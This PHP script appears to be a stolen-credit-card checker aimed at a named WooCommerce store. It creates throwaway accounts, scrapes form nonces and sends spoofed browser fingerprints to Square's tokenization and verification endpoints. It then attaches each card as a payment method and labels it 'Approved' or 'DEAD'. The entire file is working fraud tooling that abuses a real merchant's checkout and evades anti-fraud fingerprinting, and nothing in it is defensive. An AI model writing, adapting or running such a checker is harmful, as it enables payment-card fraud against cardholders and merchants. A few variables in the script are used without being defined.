<?php
error_reporting(0);
set_time_limit(0);

$cookie = "cookie-".rand(1000,9999)."txt";
$lista = $_GET["lista"];
$array = explode("|", $lista);
$cc = $array[0];
$mes = $array[1];
$ano = $array[2];
$cvv = $array[3];
$mes1 = str_replace(0,"",$mes);
$ano1 = str_replace(20,"",$ano);






function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false) {
return "";
}

$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor){
return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

function GetStr($string, $start, $end){
$string = ' ' . $string;
$ini = strpos($string, $start);
if ($ini == 0) return '';
$ini += strlen($start);
$len = strpos($string, $end, $ini) - $ini;
return trim(strip_tags(substr($string, $ini, $len)));
}

function multiexplode($seperator, $string){
$one = str_replace($seperator, $seperator[0], $string);
$two = explode($seperator[0], $one);
return $two;
};

function random($length = 12) { 
  return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length); 
} 

$user = random();
$email = $user . '@gmail.in';
$ema = $user . '@gmail.in';


///////////[ GET REQ ]/////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://leafpeople.com/my-account/');
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: GET',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.42',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
$r1 = curl_exec($ch);


$res = trim(strip_tags(getStr($r1,'type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="','"')));   

///////////[ res REQ ]////////////////



 $ch = curl_init('https://leafpeople.com/my-account/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: POST',
'content-type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Pragma: no-cache',
'Accept: */*',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$ema.'&woocommerce-register-nonce='.$res.'&_wp_http_referer=%2Fmy-account%2F&register=Register');
$r2 = curl_exec($ch);
curl_close($ch);

///////////[ 2GET REQ ]////////////////
    
$ch = curl_init('https://leafpeople.com/my-account/add-payment-method/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: GET',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.42',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
$r3 = curl_exec($ch);
curl_close($ch);

$cnonce = trim(strip_tags(getStr($r3,'name="woocommerce-add-payment-method-nonce" value="','"')));   

  
$ch = curl_init('https://pci-connect.squareup.com/payments/hydrate?applicationId=sq0idp-wGVapF8sNt9PLrdj5znuKA&hostname=leafpeople.com&locationId=2FAHXVHAGJ0P7&version=1.50.1');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: GET',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.42',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
$r4 = curl_exec($ch);
curl_close($ch);

$sessionId = trim(strip_tags(getStr($r4,'"sessionId":"','"')));
    
///////////[ 5 REQ ]////////////////
$ch = curl_init('https://connect.squareup.com/v2/analytics/token');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: POST',
'content-type: application/json',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Pragma: no-cache',
'Accept: */*',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"components":"{\"user_agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.48\",\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1366,768],\"available_resolution\":[1366,728],\"timezone_offset\":-120,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Arial Unicode MS\",\"Book Antiqua\",\"Bookman Old Style\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Century\",\"Century Gothic\",\"Century Schoolbook\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Garamond\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Bright\",\"Lucida Calligraphy\",\"Lucida Console\",\"Lucida Fax\",\"Lucida Handwriting\",\"Lucida Sans\",\"Lucida Sans Typewriter\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"Monotype Corsiva\",\"MS Gothic\",\"MS Outlook\",\"MS PGothic\",\"MS Reference Sans Serif\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]}","fingerprint":"535c4492a139a17c51edda91316f46ec","timezone":"-120","user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.48","version":"a1f7db73d24bdeaeea002d048659ff3f2cae6703","website_url":"https://leafpeople.com/","client_id":"sq0idp-wGVapF8sNt9PLrdj5znuKA","browser_fingerprint_by_version":[{"payload_json":"{\"components\":{\"user_agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.48\",\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1366,768],\"available_resolution\":[1366,728],\"timezone_offset\":-120,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Arial Unicode MS\",\"Book Antiqua\",\"Bookman Old Style\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Century\",\"Century Gothic\",\"Century Schoolbook\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Garamond\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Bright\",\"Lucida Calligraphy\",\"Lucida Console\",\"Lucida Fax\",\"Lucida Handwriting\",\"Lucida Sans\",\"Lucida Sans Typewriter\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"Monotype Corsiva\",\"MS Gothic\",\"MS Outlook\",\"MS PGothic\",\"MS Reference Sans Serif\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]},\"fingerprint\":\"535c4492a139a17c51edda91316f46ec\"}","payload_type":"fingerprint-v1"},{"payload_json":"{\"components\":{\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1366,768],\"available_resolution\":[1366,728],\"timezone_offset\":-120,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Arial Unicode MS\",\"Book Antiqua\",\"Bookman Old Style\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Century\",\"Century Gothic\",\"Century Schoolbook\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Garamond\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Bright\",\"Lucida Calligraphy\",\"Lucida Console\",\"Lucida Fax\",\"Lucida Handwriting\",\"Lucida Sans\",\"Lucida Sans Typewriter\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"Monotype Corsiva\",\"MS Gothic\",\"MS Outlook\",\"MS PGothic\",\"MS Reference Sans Serif\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]},\"fingerprint\":\"7881c7c11bab4fabc373883a1a536330\"}","payload_type":"fingerprint-v1-sans-ua"}]}');
$r5 = curl_exec($ch);
curl_close($ch);

$token = trim(strip_tags(getStr($r5,'{"token":"','"')));

///////////[ 6 REQ ]////////////////

 $ch = curl_init('https://pci-connect.squareup.com/v2/card-nonce?_=1688490686793.7092&version=1.50.1');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: POST',
'content-type: application/json',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Pragma: no-cache',
'Accept: */*',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"client_id":"sq0idp-wGVapF8sNt9PLrdj5znuKA","location_id":"2FAHXVHAGJ0P7","payment_method_tracking_id":"'.$sess.'","session_id":"'.$sessionId.'","website_url":"leafpeople.com","analytics_token":"'.$token.'","card_data":{"cvv":"'.$cvv.'","exp_month":'.$mes1.',"exp_year":'.$ano.',"number":"'.$cc.'"}}');
$r6 = curl_exec($ch);
curl_close($ch);

$nonce = trim(strip_tags(getStr($r6,'{"card_nonce":"','"')));   
$last4 = trim(strip_tags(getStr($r6,'"last_4":"','"')));  
$cardbrand = trim(strip_tags(getStr($r6,'"card_brand":"','"')));  

///////////[ 7 REQ ]////////////////

$ch = curl_init('https://connect.squareup.com/v2/analytics/verifications');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: POST',
'content-type: application/json',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Pragma: no-cache',
'Accept: */*',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"browser_fingerprint_by_version":[{"payload_json":"{\"components\":{\"user_agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.48\",\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1366,768],\"available_resolution\":[1366,728],\"timezone_offset\":-120,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Arial Unicode MS\",\"Book Antiqua\",\"Bookman Old Style\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Century\",\"Century Gothic\",\"Century Schoolbook\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Garamond\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Bright\",\"Lucida Calligraphy\",\"Lucida Console\",\"Lucida Fax\",\"Lucida Handwriting\",\"Lucida Sans\",\"Lucida Sans Typewriter\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"Monotype Corsiva\",\"MS Gothic\",\"MS Outlook\",\"MS PGothic\",\"MS Reference Sans Serif\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]},\"fingerprint\":\"535c4492a139a17c51edda91316f46ec\"}","payload_type":"fingerprint-v1"},{"payload_json":"{\"components\":{\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1366,768],\"available_resolution\":[1366,728],\"timezone_offset\":-120,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Arial Unicode MS\",\"Book Antiqua\",\"Bookman Old Style\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Century\",\"Century Gothic\",\"Century Schoolbook\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Garamond\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Bright\",\"Lucida Calligraphy\",\"Lucida Console\",\"Lucida Fax\",\"Lucida Handwriting\",\"Lucida Sans\",\"Lucida Sans Typewriter\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"Monotype Corsiva\",\"MS Gothic\",\"MS Outlook\",\"MS PGothic\",\"MS Reference Sans Serif\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]},\"fingerprint\":\"7881c7c11bab4fabc373883a1a536330\"}","payload_type":"fingerprint-v1-sans-ua"}],"browser_profile":{"components":"{\"user_agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.48\",\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1366,768],\"available_resolution\":[1366,728],\"timezone_offset\":-120,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Arial Unicode MS\",\"Book Antiqua\",\"Bookman Old Style\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Century\",\"Century Gothic\",\"Century Schoolbook\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Garamond\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Bright\",\"Lucida Calligraphy\",\"Lucida Console\",\"Lucida Fax\",\"Lucida Handwriting\",\"Lucida Sans\",\"Lucida Sans Typewriter\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"Monotype Corsiva\",\"MS Gothic\",\"MS Outlook\",\"MS PGothic\",\"MS Reference Sans Serif\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]}","fingerprint":"535c4492a139a17c51edda91316f46ec","timezone":"-120","user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.48","version":"a1f7db73d24bdeaeea002d048659ff3f2cae6703","website_url":"https://leafpeople.com/"},"client_id":"sq0idp-wGVapF8sNt9PLrdj5znuKA","payment_source":"'.$nonce.'","universal_token":{"token":"2FAHXVHAGJ0P7","type":"UNIT"},"verification_details":{"billing_contact":{"address_lines":["",""],"city":"","country":"US","email":"'.$ema.'","family_name":"","given_name":"","phone":"","postal_code":"","region":""},"intent":"STORE"}}');
$r7 = curl_exec($ch);
curl_close($ch);
$verf = trim(strip_tags(getStr($r7,'{"token":"','"')));   
    


$ch =curl_init("https://www.fakexy.com/fake-name-generator-".$ccode);
curl_setopt($ch, CURLOPT_HTTPHEADER,[
'authority: www.fakexy.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'accept-language: en-GB,en-EG;q=0.9,en;q=0.8,ar-EG;q=0.7,ar;q=0.6,en-US;q=0.5',
'cache-control: no-cache',
'pragma: no-cache',
'referer: android-app://me.ninjagram.messenger/',
'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"',
'sec-ch-ua-mobile: ?1',
'sec-ch-ua-platform: "Android"',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: cross-site',
'sec-fetch-user: ?1',
'upgrade-insecure-requests: 1',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
$result = curl_exec($ch);
curl_close($ch);
preg_match_all('/<td>Zip\/Postal Code<\/td>
        						<td>(.*?)<\/td>/',$result,$zip);
$zip = trim($zip[1][0]);



$ch = curl_init('https://leafpeople.com/my-account/add-payment-method/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: POST',
'content-type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Pragma: no-cache',
'Accept: */*',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=square_credit_card&wc-square-credit-card-card-type='.$cardbrand.'&wc-square-credit-card-last-four='.$last4.'&wc-square-credit-card-exp-month='.$mes1.'&wc-square-credit-card-exp-year='.$ano.'&wc-square-credit-card-payment-nonce='.$nonce.'&wc-square-credit-card-payment-postcode='.$zip.'&wc-square-credit-card-buyer-verification-token='.$verf.'&wc-square-credit-card-amount=&wc-square-credit-card-tokenize-payment-method=true&woocommerce-add-payment-method-nonce='.$cnonce.'&_wp_http_referer=/my-account/add-payment-method/&woocommerce_add_payment_method=1');
$r8 = curl_exec($ch);
curl_close($ch);


preg_match_all('/<ul class="woocommerce-error" role="alert"><li>(.*?)<\/li><\/ul>/',$r8,$msg);
$message = trim($msg[1][0]);


unlink($cookie);
if(strpos($r8,"Nice! New payment method added")){
echo "
<b>#Approved : $lista  ✅
<br>RESPONSE: AUTHORIZED
 ";
} else {
echo "
<b>#DEAD : $lista  ❌
<br>RESPONSE: $message
 ";
}
